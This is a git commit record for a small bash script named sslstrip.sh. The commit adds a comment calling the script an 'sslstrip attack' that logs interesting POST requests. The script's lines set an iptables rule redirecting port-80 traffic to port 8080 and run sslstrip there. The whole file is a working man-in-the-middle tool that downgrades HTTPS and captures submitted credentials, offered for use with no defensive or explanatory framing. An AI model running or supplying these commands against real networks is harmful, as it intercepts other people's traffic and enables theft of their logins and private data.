46df6f057b5d257b14f689565275c370e1756bf2
FlexedBrute <olshefski.3@osu.edu>
2018-12-05 13:20:15 -0500

    Update sslstrip.sh

--- sslstrip.sh
+++ sslstrip.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
+# sslstrip attack that will put intresting POST requests in sslstrip.log
 sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 sudo sslstrip -l 8080
